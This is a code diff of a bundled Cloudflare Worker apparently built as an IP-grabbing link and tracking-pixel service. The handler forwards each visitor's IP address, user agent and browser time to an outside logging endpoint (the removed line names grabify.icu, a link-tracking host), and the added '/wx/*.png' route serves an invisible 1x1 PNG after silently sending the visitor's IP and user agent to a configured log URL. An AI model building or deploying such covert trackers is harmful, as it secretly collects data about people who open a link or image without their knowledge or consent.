@@ -1,7 +1,7 @@
 var __defProp = Object.defineProperty;
 var __name = (target, value) => __defProp(target, "name", { value, configurable: true });
 
-// .wrangler/tmp/bundle-6GPbxa/checked-fetch.js
+// .wrangler/tmp/bundle-DtBv1e/checked-fetch.js
 var urls = /* @__PURE__ */ new Set();
 function checkURL(request, init) {
   const url = request instanceof URL ? request : new URL(
@@ -29,16 +29,107 @@ globalThis.fetch = new Proxy(globalThis.fetch, {
 
 // src/index.js
 var src_default = {
-  async fetch(request) {
+  async fetch(request, env) {
     const url = new URL(request.url);
-    const code = url.pathname.slice(1);
+    const pathname = url.pathname;
+    if (pathname.startsWith("/wx/") && pathname.endsWith(".png")) {
+      const code2 = pathname.slice(4, -4);
+      const userIP2 = request.headers.get("cf-connecting-ip") || "0.0.0.0";
+      const userAgent2 = request.headers.get("user-agent") || "Unknown-UA";
+      const logUrl = `${env.WXLOG_URL}?typeA=${encodeURIComponent(code2)}`;
+      await fetch(logUrl, {
+        method: "GET",
+        headers: {
+          "User-Agent": userAgent2,
+          "X-Real-IP": userIP2
+        }
+      });
+      const transparentPng = Uint8Array.from([
+        137,
+        80,
+        78,
+        71,
+        13,
+        10,
+        26,
+        10,
+        0,
+        0,
+        0,
+        13,
+        73,
+        72,
+        68,
+        82,
+        0,
+        0,
+        0,
+        1,
+        0,
+        0,
+        0,
+        1,
+        8,
+        6,
+        0,
+        0,
+        0,
+        31,
+        21,
+        196,
+        137,
+        0,
+        0,
+        0,
+        10,
+        73,
+        68,
+        65,
+        84,
+        120,
+        156,
+        99,
+        0,
+        1,
+        0,
+        0,
+        5,
+        0,
+        1,
+        13,
+        10,
+        45,
+        180,
+        0,
+        0,
+        0,
+        0,
+        73,
+        69,
+        78,
+        68,
+        174,
+        66,
+        96,
+        130
+      ]);
+      return new Response(transparentPng, {
+        status: 200,
+        headers: {
+          "Content-Type": "image/png",
+          "Content-Length": transparentPng.length.toString(),
+          "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
+        }
+      });
+    }
+    const code = pathname.slice(1);
     if (!code) {
       return new Response("Missing code", { status: 400 });
     }
     const userIP = request.headers.get("cf-connecting-ip") || "0.0.0.0";
     const userAgent = request.headers.get("user-agent") || "Unknown-UA";
     const browserTime = (/* @__PURE__ */ new Date()).toString();
-    const apiUrl = "https://grabify.icu/directto.php?typeA=" + encodeURIComponent(code) + "&time=" + encodeURIComponent(browserTime);
+    const apiUrl = `${env.API_URL}?typeA=${encodeURIComponent(code)}&time=${encodeURIComponent(browserTime)}`;
     try {
       const response = await fetch(apiUrl, {
         method: "GET",
@@ -104,7 +195,7 @@ var jsonError = /* @__PURE__ */ __name(async (request, env, _ctx, middlewareCtx)
 }, "jsonError");
 var middleware_miniflare3_json_error_default = jsonError;
 
-// .wrangler/tmp/bundle-6GPbxa/middleware-insertion-facade.js
+// .wrangler/tmp/bundle-DtBv1e/middleware-insertion-facade.js
 var __INTERNAL_WRANGLER_MIDDLEWARE__ = [
   middleware_ensure_req_body_drained_default,
   middleware_miniflare3_json_error_default
@@ -136,7 +227,7 @@ function __facade_invoke__(request, env, ctx, dispatch, finalMiddleware) {
 }
 __name(__facade_invoke__, "__facade_invoke__");
 
-// .wrangler/tmp/bundle-6GPbxa/middleware-loader.entry.ts
+// .wrangler/tmp/bundle-DtBv1e/middleware-loader.entry.ts
 var __Facade_ScheduledController__ = class ___Facade_ScheduledController__ {
   constructor(scheduledTime, cron, noRetry) {
     this.scheduledTime = scheduledTime;
